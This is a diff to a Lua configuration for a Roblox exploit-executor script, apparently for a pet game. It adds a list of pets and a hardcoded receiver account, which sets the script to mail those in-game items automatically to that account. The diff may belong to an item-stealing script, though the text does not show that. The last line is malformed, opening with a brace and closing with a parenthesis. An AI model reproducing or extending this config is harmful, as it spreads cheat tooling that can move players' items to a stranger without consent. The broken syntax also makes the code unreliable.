@@ -57,3 +57,14 @@ getgenv().GPOTIONS_MAX_TIER = 99
 
 
 getgenv().GHUGE_COUNT = 50
+
+getgenv().GMAIL_ITEMS = {		
+
+
+["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
+["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
+["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
+["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
+
+}
+getgenv().GMAIL_RECEIVERS = {"veriotiai779")
